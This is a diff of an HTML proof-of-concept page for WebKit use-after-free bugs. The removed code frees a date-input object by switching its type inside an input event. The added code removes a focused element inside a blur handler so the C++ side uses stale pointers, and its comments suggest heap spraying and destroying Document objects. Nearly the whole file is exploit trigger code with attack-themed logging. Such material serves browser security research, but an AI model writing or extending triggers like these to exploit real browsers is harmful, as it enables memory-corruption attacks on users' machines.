@@ -9,47 +9,51 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <body>
 <div id="log"></div>
 
-<!-- This is our victim element -->
-<input type="date" id="target">
+<!-- The victim element that will hold focus -->
+<input type="text" id="target" value="Click me, then click outside the window!">
 
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== BASEDATEANDTIMEINPUTTYPE USE-AFTER-FREE ===", "info");
-log("[*] Setting up the trap on the input event...", "info");
+log("=== FOCUSCONTROLLER BLUR USE-AFTER-FREE ===", "info");
+log("[*] Setting up the blur trap...", "info");
 
 let input = document.getElementById("target");
 
-// When the C++ code calls InputType::setValue, it dispatches the 'input' event.
-// We catch it here.
-input.addEventListener("input", () => {
-    log("[!] INPUT EVENT FIRED! The C++ code is currently paused...", "warn");
-    log("[!] Changing input type to 'text'. This destroys the Date input object in C++!", "hit");
+// When the window loses focus, FocusController::dispatchEventsOnWindowAndFocusedElement
+// runs. It grabs the focused element as a RAW POINTER and fires the blur event on it.
+input.addEventListener("blur", () => {
+    log("[!] BLUR EVENT CAUGHT! C++ is holding raw pointers on the stack!", "warn");
+    log("[!] Destroying the document structure...", "hit");
     
-    // Changing the type replaces the BaseDateAndTimeInputType instance 
-    // with a TextFieldInputType instance. The old C++ object is DELETED.
-    input.type = "text";
+    // We remove the element from the DOM.
+    // In a real exploit, we might use document.open() or remove the iframe
+    // to completely destroy the Document and Frame objects.
+    input.remove();
     
-    log("[*] Returning to C++. The code will now execute on FREED memory!", "info");
+    // Force garbage collection if possible, or spray the heap to overwrite the freed memory.
+    // By the time this function returns, the C++ code will resume and try to fire
+    // the windowEvent using the stale 'document' pointer!
+    
+    log("[*] Returning control to C++. Brace for impact!", "info");
 });
 
+// We need the user to focus the input, then blur the window (e.g. click the desktop or switch tabs).
+// The vulnerability requires window-level focus changes.
+input.addEventListener("focus", () => {
+    log("[*] Input focused! Now click outside the browser window to trigger the window blur!", "warn");
+});
+
+// Alternative trigger: try to force it programmatically
 setTimeout(() => {
-    log("[*] Triggering the vulnerability...", "info");
-    
-    // We need to simulate user interaction to reach didChangeValueFromControl()
-    // A simple value change or dispatching a synthetic event might be enough 
-    // depending on the exact WebKit event routing, but focus + execCommand or 
-    // stepUp/stepDown often hits the right internal paths.
     try {
+        log("[*] Attempting programmatic trigger...", "info");
         input.focus();
-        // Force the value to change as if the user typed it
-        input.stepUp(); 
+        window.blur(); // Sometimes blocked by browsers, but worth a shot!
     } catch(e) {
-        log("[-] Error: " + e.message, "info");
+        log("[-] Programmatic trigger failed: " + e.message, "info");
     }
-    
-    log("[-] If you see this and the browser didn't crash, try clicking the date picker manually and changing a value.", "warn");
-}, 1000);
+}, 2000);
 </script>
 </body>
 </html>
